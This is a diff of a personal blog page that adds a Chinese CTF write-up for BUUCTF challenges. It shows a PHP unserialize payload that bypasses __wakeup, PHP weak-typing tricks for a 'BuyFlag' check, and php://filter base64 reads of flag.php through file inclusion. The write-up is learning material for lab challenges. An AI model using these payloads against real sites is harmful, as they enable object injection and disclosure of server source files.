+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__destruct()<span class="comment">//与__construct()相对应的函数——析构函数。析构函数的作用和构造函数正好相反，析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>还不太会写，我到网上看了几个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="keyword">new</span> Name());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&quot;yesyesyes&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name(@admin,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//var_dump($a);</span></span><br><span class="line"><span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//输出序列化</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);<span class="comment">//输出url编码后的序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个有些许问题，下周出一个反序列对比专题，<br><img src="https://img-blog.csdnimg.cn/cdd012ace7c24b1f9c41ba4fd392764b.png" alt="在这里插入图片描述"><br>Nameusername与前面的14不对应，少了两个字符，而Namepassword也是少了两个字符，username和password变量是private类型，变量中的类名前后会有空白符，而复制易丢失，所以还需要加上%00，同时要绕过_wakeup()，还要将Name后面的数字修改为大于2的数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/d6f9ffa048e444b18f4179a9a6a372bd.png" alt="在这里插入图片描述"></p>
+<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p><img src="https://img-blog.csdnimg.cn/1741c87b8f75479ea428cc68e0cd63c6.png" alt="在这里插入图片描述"><br>查看网页源代码<br><img src="https://img-blog.csdnimg.cn/e6a9371996cd4b03b542a474e09c3bf2.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_numeric()，判断输入是否是数字的</span><br></pre></td></tr></table></figure>
+<p>利用php的弱类型比较，用404a或者404%20均可，不会被认为是数字</p>
+<p><img src="https://img-blog.csdnimg.cn/ce12670fe7b44e698e8f5bf84ab2ce7a.png" alt="在这里插入图片描述"><br>他说我没钱<br><img src="https://img-blog.csdnimg.cn/62c0f43709ad45ef882f29275864358d.png" alt="在这里插入图片描述"><br>又嫌弃钱太长，尝试科学表达式<code>money=1e10</code><br><img src="https://img-blog.csdnimg.cn/8e28c393e30d4e22a4ed9ab35af9b576.png" alt="在这里插入图片描述"><br>在网上看到还可以<code>money[]=4</code>，原理忘记保存了，密码post，个人习惯认为插件更方便，注意：Cookie中的user表示身份，<br><img src="https://img-blog.csdnimg.cn/e99d7068765b4027a3087938349c13f9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/59f4746af36444bda507b26e5edf40d2.png" alt="在这里插入图片描述"></p>
+<h2 id="尝试抓包"><a href="#尝试抓包" class="headerlink" title="尝试抓包"></a>尝试抓包</h2><p><img src="https://img-blog.csdnimg.cn/8dff10b0dc3c4a8a8f620037adaa9a09.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/73a8988a7b8f4bc6a9cc7b2629f672b2.png" alt="在这里插入图片描述"><br>POST更改不成功！<br>[极客大挑战 2019]这个专题到此结束其余两个题太难，还有sql几个打算放一起整一个SQL专栏。</p>
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>图片来自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54786552/article/details/118732644?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-118732644-blog-109998649.pc_relevant_aa2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-118732644-blog-109998649.pc_relevant_aa2&utm_relevant_index=1">参考文章</a>！<a target="_blank" rel="noopener" href="https://blog.csdn.net/yu748913833/article/details/115683384?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-115683384-blog-118732644.pc_relevant_multi_platform_whitelistv2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-115683384-blog-118732644.pc_relevant_multi_platform_whitelistv2&utm_relevant_index=1">文章2</a>！<br>用php伪协议进行读取flag.php文件，base64编码的方式读文件flag.php<br><img src="https://img-blog.csdnimg.cn/9be8fb315bc845a2989ba6965201948d.png" alt="在这里插入图片描述"><br>64解码！<br><img src="https://img-blog.csdnimg.cn/3ad854f1149842f9a43b19477b289bc1.png" alt="在这里插入图片描述"><br>补充！</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">readfile(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=example.etc&quot;</span>);</span><br><span class="line">readfile(<span class="string">&quot;php://filter/read=string.toupper/resource=example.etc&quot;</span>);</span><br><span class="line">readfile(<span class="string">&quot;php://filter/read=string.toupper|string.rot13/resource=example.etc&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/cc21bba620c74742a8eced33cc03ddee.png" alt="在这里插入图片描述"></p>
 
                 
             </div>
@@ -511,7 +545,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://BvxiE.github.io/2022/02/18/PHP%E7%AC%94%E8%AE%B0%2013%2014%2015%2016/">http://BvxiE.github.io/2022/02/18/PHP%E7%AC%94%E8%AE%B0%2013%2014%2015%2016/</a>
+                    <a href="http://BvxiE.github.io/2022/07/23/Buu%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5D/">http://BvxiE.github.io/2022/07/23/Buu%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5D/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -720,54 +754,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2022/02/25/PHPstudy+Vscode%E9%85%8D%E7%BD%AEphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/">
+                <a href="/2022/07/23/Buu%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5D/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="PHPstudy+Vscode配置php开发环境">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Buu[极客大挑战 2019]">
                         
-                        <span class="card-title">PHPstudy+Vscode配置php开发环境</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-25
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            BvxiE
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/02/18/HTML&CSS/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="HTML&amp;CSS">
-                        
-                        <span class="card-title">HTML&amp;CSS</span>
+                        <span class="card-title">Buu[极客大挑战 2019]</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -778,7 +776,45 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            BvxiE
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/07/22/OD%E7%AA%97%E5%8F%A3%E4%BF%AE%E6%94%B9/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="OD窗口修改">
+                        
+                        <span class="card-title">OD窗口修改</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-22
                             </span>
                         <span class="publish-author">
                             
